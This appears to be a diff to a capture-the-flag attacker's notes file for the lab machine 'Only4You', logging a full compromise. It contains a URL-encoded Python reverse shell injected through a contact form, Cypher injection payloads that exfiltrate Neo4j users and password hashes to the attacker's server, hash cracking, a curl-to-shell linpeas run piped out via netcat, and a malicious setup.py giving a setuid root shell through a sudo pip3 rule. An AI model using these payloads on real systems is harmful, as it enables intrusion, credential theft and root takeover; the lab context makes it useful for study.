@@ -9,10 +9,11 @@
 - Notes: 
 
 //CREDS:
+// john : ThisIs4You
 
 //Flags:
-#User:
-#System:
+#User:		c506c2fb6285dfa447ed5140ad295ab4
+#System:	6c144633876c767c180fd2d9ee893e0b
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -58,7 +59,6 @@ sudo sh -c "echo '10.129.255.111\tonly4you.htb' >> /etc/hosts"
 cat /etc/hosts
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
 
 
 -- feroxbuster --
@@ -503,7 +503,8 @@ curl 10.10.16.25:80/linpeas.sh | sh | nc 10.10.16.25 443
 less -r linpeas.out
 
 ╔══════════╣ CVEs Check
-Vulnerable to CVE-2021-3560                                                                              Potentially Vulnerable to CVE-2022-2588
+Vulnerable to CVE-2021-3560
+Potentially Vulnerable to CVE-2022-2588
 
 ╔══════════╣ Executing Linux Exploit Suggester
 [+] [CVE-2022-2586] nft_object UAF
@@ -723,9 +724,397 @@ https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+########
+#BREAK
+#######
+
+2023-04-25 20:28:22 CDT -- BACK!!!
+
+// REBIRTH
+// 10.129.206.45
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.206.45\tonly4you.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-25 20:34:21 CDT -- 
+//StartListener
+sudo rlwrap -cAr nc -lvnp 443
+
+2023-04-25 20:34:40 CDT -- 
+//Python3 RevShell
+curl -s -k -X $'POST' http://only4you.htb/ --data-binary $'name=TEST&email=TEST%40test.com%3bpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.7%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27&subject=BLAH&message=THis+is+a+test'
+//SUCCESS
+
+mktemp -d
+/tmp/tmp.V25zWyypqv
+
+cd /tmp/tmp.V25zWyypqv
+
+// chisel
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sudo apt install chisel
+
+// chisel for linux is previously downloaded as a chisel x64 elf
+
+
+// linux server with target client calling back
+  // kali
+sudo chisel server --port 6969 --reverse --socks5
+//MjQpI8z6s6lBz4RQ3Dc9XFahdmflhx5knUUkKiuPa8k=
+
+sudo python3 -m http.server 80
+
+  // target
+// upload chisel.exe
+2023-04-25 20:45:27 CDT -- 
+wget http://10.10.16.7:80/chisel
+
+chmod +x chisel
+
+2023-04-25 20:45:35 CDT -- 
+// socks5 proxy
+./chisel client --fingerprint MjQpI8z6s6lBz4RQ3Dc9XFahdmflhx5knUUkKiuPa8k= 10.10.16.7:6969 R:9050:socks
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-25 20:48:44 CDT -- 
+//Open a second RevShell
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Set up browser through the chisel SOCKS5 proxy
+
+// Only4You
+// http://127.0.0.1:8001
+// Cypher Injection (neo4j)
+// Login:
+	User: admin
+	Pass: admin
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
+
+// http://127.0.0.1:8001/employees
+// Has vuln search function
+
+//Trying Cypher Injection
+' OR 1=1 WITH 0 as _l00 {…} RETURN 1 //
+//FAIL-500 Server Error
+
+'=' {…} WITH 0 as _l00 RETURN 1 //
+a {…} WITH 0 as _l00 RETURN 1 //
+//FAIL
+
+//Trying HTTP Exfiltration
+//Kali
+sudo python3 -m http.server 8000
+
+
+// Injection to get all the procedures
+' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://10.10.16.7:5000/' + name as _l RETURN 1 // 
+//FAIL-500 Server Error
+
+2023-04-25 21:20:05 CDT -- 
+//Get Server Version
+' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.7:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+
+GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1
+User-Agent: NeoLoadCSV_Java/17.0.6+10-Ubuntu-0ubuntu120.04.1
+
+2023-04-25 21:33:09 CDT -- 
+//Get Running query
+' OR 1=1 WITH 1 as a CALL dbms.listQueries() YIELD query LOAD CSV FROM 'http://10.10.16.7:8000/?q='+ query as l RETURN 0 as _0 //
+//FAIL
+
+2023-04-25 21:46:08 CDT -- 
+//Get Labels
+' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.7:8000/?l='+label as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 21:47:37] "GET /?l=user HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 21:47:38] "GET /?l=employee HTTP/1.1" 200 -
+
+2023-04-25 22:04:26 CDT -- 
+//Get Property Keys
+' OR 1=1 WITH 1 as a CALL db.propertyKeys() YIELD propertyKey LOAD CSV FROM 'http://10.10.16.7:8000/?pk='+propertyKey as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 22:04:34] "GET /?pk=password HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:35] "GET /?pk=name HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:35] "GET /?pk=country HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:35] "GET /?pk=city HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:36] "GET /?pk=salary HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:04:36] "GET /?pk=username HTTP/1.1" 200 -
+
+2023-04-25 22:16:57 CDT -- 
+//Get Properties of a Key
+// User Labels
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.7:8000/?user='+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 22:12:00] "GET /?user=password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:12:01] "GET /?user=username=admin HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:12:01] "GET /?user=password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:12:02] "GET /?user=username=john HTTP/1.1" 200 -
+
+//CREDS
+admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+
+2023-04-25 22:17:00 CDT -- 
+#[*] EXTRA
+// Employee Labels
+' OR 1=1 WITH 1 as a MATCH (f:employee) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.7:8000/?employee='+ p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+10.129.206.45 - - [25/Apr/2023 22:15:14] "GET /?employee=city=London HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:15:15] "GET /?employee=salary=$36,738 HTTP/1.1" 200 -
+10.129.206.45 - - [25/Apr/2023 22:15:15] code 400, message Bad request syntax ('GET /?employee=name=Sarah Jhonson HTTP/1.1')
+10.129.206.45 - - [25/Apr/2023 22:15:15] "GET /?employee=name=Sarah Jhonson HTTP/1.1" 400 -
+
+//INFO
+Sarah Jhonson:London:$36,738
+//NOTE: Sarah is not doing that well in London as Product Manager
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// CRAck Hashes
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+echo 'admin:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' > user.hash
+echo 'john:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6' >> user.hash
+
+//admin
+hash-identifier 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+echo '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' | hashid -j
+[+] SHA-256 [JtR Format: raw-sha256]
+
+
+//john
+hash-identifier a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+echo 'a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6' | hashid -j
+[+] SHA-256 [JtR Format: raw-sha256]
+
+sudo gunzip -d /usr/share/wordlists/rockyou.txt.gz
+
+2023-04-25 22:28:25 CDT -- 
+john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt user.hash 
+
+admin            (admin)     
+ThisIs4You       (john)
+
+//john is the only one with an account on box based on passwd
+// Lets try cred reuse with SSH
+
+//NOTE: John's creds work on http://127.0.0.1:3000/ Gogs but he has only a "Test" repo with nothing in it.
+//NOTE: John's creds DO NOT work on http://127.0.0.1:7474/ Neo4j site
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// SSH Access
+// john:ThisIs4You
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-25 22:36:01 CDT -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" john@only4you.htb
+// Password:  ThisIs4You
+
+2023-04-25 22:36:36 CDT -- 
+id
+uid=1000(john) gid=1000(john) groups=1000(john)
+//SUCCESS
+
+ls -l
+total 4
+-rw-r----- 1 root john 33 Apr 26 01:31 user.txt
+
+cat user.txt 
+// c506c2fb6285dfa447ed5140ad295ab4
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (john)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-25 22:37:07 CDT -- 
+sudo -ll
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on only4you:
+
+Sudoers entry:
+    RunAsUsers: root
+    Options: !authenticate
+    Commands:
+        /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+
+//NOTE: For john env_reset and a /usr/bin/pip3 download from the Gogs website is available
+//Need to create a priv esc and upload it to Gogs so pip3 can install it
+//Going to run linpeas first to get a better idea or possibly find another route
+
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//linpeas is still downloaded from previous run
+
+// upload linpeas to target
+mktemp -d
+/tmp/tmp.yuJ5yAhICy
+cd /tmp/tmp.yuJ5yAhICy
+
+2023-04-25 23:00:10 CDT -- 
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 8000
+  // kali term2
+nc -lvnp 443 | tee linpeas_john.out
+  // target
+curl 10.10.16.7:8000/linpeas.sh | sh | nc 10.10.16.7 443
+
+less -r linpeas_john.out
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+//Mostly the same as the linpeas out of www-data
+//Need to figure out how to do a pip3 module privesc
+
+mkdir fakepip_privesc
+cd fakepip_privesc
+
+// FakePip exploit
+// /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import os
+
+def RunCommand():
+    os.system("mkdir -p /tmp/xGh05t")
+    os.system("cp /bin/bash /tmp/xGh05t")
+    os.system("chmod +sx /tmp/xGh05t/bash")
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+setup(
+    name = "xGh05t_fakePip",
+    description='This will exploit a sudoer able to /usr/bin/pip3 install *',
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info' : RunEggInfoCommand,
+        }
+    )
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+pip3 install setuptools
+pip3 install build
+
+2023-04-26 00:47:49 CDT -- 
+python3 -m build
+
+//Successfully built xGh05t_fakePip-0.0.0.tar.gz and xGh05t_fakePip-0.0.0-py3-none-any.whl
+
+tar -tzvf dist/xGh05t_fakePip-0.0.0.tar.gz
+drwxr-xr-x kali/kali         0 2023-04-26 01:13 xGh05t_fakePip-0.0.0/
+-rw-r--r-- kali/kali       126 2023-04-26 01:13 xGh05t_fakePip-0.0.0/PKG-INFO
+-rw-r--r-- kali/kali        38 2023-04-26 01:13 xGh05t_fakePip-0.0.0/setup.cfg
+-rw-r--r-- kali/kali       752 2023-04-26 01:13 xGh05t_fakePip-0.0.0/setup.py
+drwxr-xr-x kali/kali         0 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/
+-rw-r--r-- kali/kali       126 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/PKG-INFO
+-rw-r--r-- kali/kali       160 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/SOURCES.txt
+-rw-r--r-- kali/kali         1 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/dependency_links.txt
+-rw-r--r-- kali/kali         1 2023-04-26 01:13 xGh05t_fakePip-0.0.0/xGh05t_fakePip.egg-info/top_level.txt
+
+//UPload xGh05t_fakePip-0.0.0.tar.gz in the Test repo on Gogs
+//Creds:
+	John:ThisIs4You
+//Make Repo public to download and run
+
+http://127.0.0.1:3000/john/Test/raw/master/xGh05t_fakePip-0.0.0.tar.gz
+
+//Run sudo command to install payload
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/xGh05t_fakePip-0.0.0.tar.gz
+
+ls -lah /tmp/xGh05t/bash 
+-rwsr-sr-x 1 root root 1.2M Apr 26 06:14 /tmp/xGh05t/bash
+
+2023-04-26 01:18:03 CDT -- 
+/tmp/xGh05t/bash -p
+
+id
+uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)
+
+ls -lah /root/root.txt 
+-rw-r----- 1 root root 33 Apr 26 01:31 /root/root.txt
+
+cat /root/root.txt
+// 6c144633876c767c180fd2d9ee893e0b
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+2023-04-26 01:37:15 CDT -- COMPLETE
 
